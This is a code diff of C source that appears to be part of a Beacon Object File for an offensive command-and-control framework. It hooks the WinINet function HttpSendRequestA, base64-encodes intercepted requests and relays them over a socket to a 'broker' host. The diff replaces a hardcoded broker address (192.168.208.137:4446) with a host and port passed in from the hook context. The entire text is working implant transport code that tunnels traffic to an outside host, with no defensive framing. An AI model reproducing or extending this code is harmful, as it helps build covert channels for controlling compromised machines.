@@ -36,8 +36,6 @@
 #include "tcg.h"
 
 
-#define BROKER_IP   "192.168.208.137"
-#define BROKER_PORT 4446
 #define BROKER_TIMEOUT_MS 5000
 #define MAX_DATAGRAM_SIZE 65535
 
@@ -45,7 +43,7 @@
 
     This is what you modify. You can put any transport you want here.
  */
-static char *customCallback(const char *encodedRequest)
+static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
 {
     HANDLE hHeap = KERNEL32$GetProcessHeap();
     DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
@@ -53,9 +51,15 @@ static char *customCallback(const char *encodedRequest)
     BOOL wsaStarted = FALSE;
     char *recvBuf = NULL;
     char *responseBuf = NULL;
+    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);
 
     if (encodedRequest == NULL || reqLen == 0) {
         MSVCRT$printf("[customCallback] no request data to send\n");
+        return NULL;
+    }
+
+    if (host == NULL || host[0] == '\0') {
+        MSVCRT$printf("[customCallback] missing host for broker connection\n");
         return NULL;
     }
 
@@ -80,11 +84,11 @@ static char *customCallback(const char *encodedRequest)
 
     struct sockaddr_in brokerAddr;
     brokerAddr.sin_family = AF_INET;
-    brokerAddr.sin_port   = WS2_32$htons(BROKER_PORT);
-    brokerAddr.sin_addr.S_un.S_addr = WS2_32$inet_addr(BROKER_IP);
+    brokerAddr.sin_port   = WS2_32$htons(port);
+    brokerAddr.sin_addr.S_un.S_addr = WS2_32$inet_addr(host);
 
     if (WS2_32$connect(sock, (SOCKADDR *)&brokerAddr, sizeof(brokerAddr)) == SOCKET_ERROR) {
-        MSVCRT$printf("[customCallback] failed to connect to broker %s:%d\n", BROKER_IP, BROKER_PORT);
+        MSVCRT$printf("[customCallback] failed to connect to broker %s:%u\n", host, (unsigned int)port);
         goto cleanup;
     }
 
@@ -1078,7 +1082,7 @@ BOOL WINAPI _HttpSendRequestA(
             DWORD reqJsonLen = (DWORD)MSVCRT$strlen(requestJson);
             char *encodedRequest = base64Encode((const BYTE *)requestJson, reqJsonLen);
             if (encodedRequest != NULL) {
-                char *encodedResponse = customCallback(encodedRequest);
+                char *encodedResponse = customCallback(encodedRequest, ctx ? ctx->host : "", ctx ? ctx->port : 0);
                 if (encodedResponse != NULL) {
                     BYTE *responseJsonBuf = NULL;
                     DWORD responseJsonLen = 0;
